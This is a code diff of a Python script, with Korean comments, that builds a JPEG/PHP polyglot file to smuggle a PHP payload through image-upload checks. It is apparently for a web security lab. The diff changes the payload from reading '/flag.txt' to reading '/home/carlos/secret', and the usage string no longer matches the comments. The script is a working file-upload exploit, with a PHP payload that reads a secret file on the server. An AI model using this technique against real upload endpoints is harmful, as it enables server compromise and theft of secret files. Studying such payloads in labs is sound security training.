@@ -1,4 +1,3 @@
-
 data = (
     b'\xff\xd8\xff\xdb\x00\x43\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07'
     b'\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d'
@@ -12,15 +11,16 @@ data = (
 
 import sys
 
+# 사용법: python3 polyglot.py <원본이미지.jpg> <출력파일.php>
 if len(sys.argv) < 2:
-    print("Usage: python3 polyglot.py <output.php>")
+    print("Usage: python3 spolyglot.py <output.php>")
     sys.exit(1)
 
 output_file = sys.argv[1]
 
 
 # 실행할 PHP 웹셸 코드
-php_payload = b"<?php echo 'START ' . file_get_contents('/flag.txt') . ' END'; ?>"
+php_payload = b"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"
 
 # JPEG Comment (COM) 세그먼트 생성 규칙:
 # \xFF\xFE (COM 마커 2바이트) + [데이터길이 2바이트] + [주석으로 실릴 진짜 데이터 가변길이]
